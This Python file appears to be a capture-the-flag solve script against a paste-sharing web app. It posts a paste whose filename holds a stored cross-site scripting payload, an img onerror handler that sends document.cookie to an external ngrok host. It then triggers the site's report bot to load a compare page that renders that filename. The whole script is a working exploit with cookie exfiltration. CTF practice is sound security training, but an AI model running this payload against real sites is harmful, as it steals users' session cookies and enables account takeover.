import sys
import requests
import typing
import re
import urllib.parse

try:
    url = sys.argv[1]
except:
    print("Usage: uv run solve.py <URL> ",file=sys.stderr)
    exit(1)

s = requests.Session()

def get_file_id(filename: str) -> str:
    r = s.get(url)
    pattern = r"<a href=\"/paste/(?P<id>\d+)\">"
    pattern += re.escape(f"{filename}</a>")
    match = re.search(pattern, r.text)
    if not match:
        return ''
    return match.group(1)


def report(target: str):
    r = s.get(url + '/report?url=' + urllib.parse.quote(target))
    return r

def report_diff(id1: str, id2: str):
    target = f"http://localhost:5002/compare_pastes?paste1={id1}&paste2={id2}"
    return report(target).text


def paste(filename: str, content: str) -> typing.Tuple[requests.Response, str]:
    r = s.post(f"{url}/", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'filename': filename,
        'content': content,
    })
    assert r.status_code == 200
    
    return (r, get_file_id(filename))

_, id1 = paste('dummy.txt', 'hello')
attacker = 'https://d8e5-176-29-229-249.ngrok-free.app/flag/'
paste(f"filllle2.txt<img src=x onerror=\"window.location = '{attacker}' + document.cookie\"/>", 'hey')

# adding +1 because I don't feel like fixing my get_file_id function :P
report_diff(id1, str(int(id1)+1))
